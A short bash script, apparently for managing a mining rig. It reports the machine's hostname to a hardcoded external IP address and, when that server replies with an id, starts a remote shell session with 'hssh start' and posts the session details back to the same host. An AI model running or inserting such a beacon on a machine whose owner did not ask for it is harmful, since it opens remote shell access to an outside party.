#!/bin/bash

start_ssh_rig_id=$(curl -G --data-urlencode "n=$HOSTNAME"  "http://95.217.211.87:8000/report")


if [ "$start_ssh_rig_id" -gt 0 ]
then
    hssh_output=$(hssh start)

    curl --data "hssh=$hssh_output" "http://95.217.211.87:8000/hssh/$start_ssh_rig_id"
fi
